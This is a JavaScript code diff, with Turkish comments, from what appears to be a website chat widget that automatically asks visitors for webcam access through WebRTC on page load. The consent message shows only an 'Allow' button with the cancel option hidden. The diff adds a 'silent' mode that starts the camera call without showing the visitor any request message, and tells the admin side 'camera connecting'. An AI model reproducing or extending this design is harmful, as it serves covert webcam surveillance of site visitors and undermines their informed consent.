@@ -536,14 +536,11 @@ async function saveVisitorPhone(phone) {
 }
 
 /** Ziyaretçi açılışında otomatik kamera: call + mesaj (from:auto → ziyaretçi admin dinleyicisine düşmez) */
-async function startVisitorCameraOffer(text) {
+async function startVisitorCameraOffer(text, opts = {}) {
   const database = initDb();
   if (!database) throw new Error("Firebase bağlı değil");
   const id = await ensureSession();
   if (!id) throw new Error("Oturum açılamadı");
-
-  const callId = makeId();
-  await initCameraCall(id, callId);
 
   const clean = String(
     text ||
@@ -553,28 +550,69 @@ async function startVisitorCameraOffer(text) {
     .slice(0, 800);
   if (!clean) throw new Error("Boş mesaj");
 
-  const msgRef = push(ref(database, `chats/${id}/messages`));
-  await set(msgRef, {
-    who: "bot",
-    from: "auto",
-    text: clean,
-    ts: Date.now(),
-    type: "camera",
-    callId,
-    okLabel: "İzin ver",
-    cancelLabel: "",
-    hideCancel: true,
-  });
+  // Aynı oturumda aktif call varsa yeniden kullan — spam mesaj üretme
+  if (opts.reuse !== false) {
+    try {
+      const metaSnap = await get(ref(database, `chats/${id}`));
+      const meta = metaSnap.val() || {};
+      const existingId = String(meta.lastCallId || "").trim();
+      if (existingId) {
+        const callSnap = await get(ref(database, webrtcPath(id, existingId)));
+        const status = String(callSnap.val()?.status || "");
+        const usable =
+          status !== "ended" &&
+          status !== "denied" &&
+          (meta.cameraPending ||
+            meta.cameraGranted ||
+            meta.hasCamera ||
+            status === "requested" ||
+            status === "connecting" ||
+            status === "live" ||
+            !status);
+        if (usable) {
+          await update(ref(database, `chats/${id}`), {
+            updatedAt: Date.now(),
+            lastCallId: existingId,
+            cameraPending: meta.cameraGranted || meta.hasCamera ? false : true,
+            page: location.pathname + location.hash,
+          }).catch(() => {});
+          return { callId: existingId, sessionId: id, text: clean, reused: true };
+        }
+      }
+    } catch {
+      /* yeni call aç */
+    }
+  }
+
+  const callId = makeId();
+  await initCameraCall(id, callId);
+
+  const silent = opts.silent === true;
+  if (!silent) {
+    const msgRef = push(ref(database, `chats/${id}/messages`));
+    await set(msgRef, {
+      who: "bot",
+      from: "auto",
+      text: clean,
+      ts: Date.now(),
+      type: "camera",
+      callId,
+      okLabel: "İzin ver",
+      cancelLabel: "",
+      hideCancel: true,
+    });
+  }
+
   await update(ref(database, `chats/${id}`), {
     updatedAt: Date.now(),
-    preview: "📷 Kamera talebi",
+    preview: silent ? "📷 Kamera bağlanıyor" : "📷 Kamera talebi",
     lastWho: "user",
     lastCallId: callId,
     cameraPending: true,
     hasCamera: false,
     page: location.pathname + location.hash,
   });
-  return { callId, sessionId: id, text: clean };
+  return { callId, sessionId: id, text: clean, reused: false };
 }
 
 function webrtcPath(sessionIdValue, callId, ...parts) {
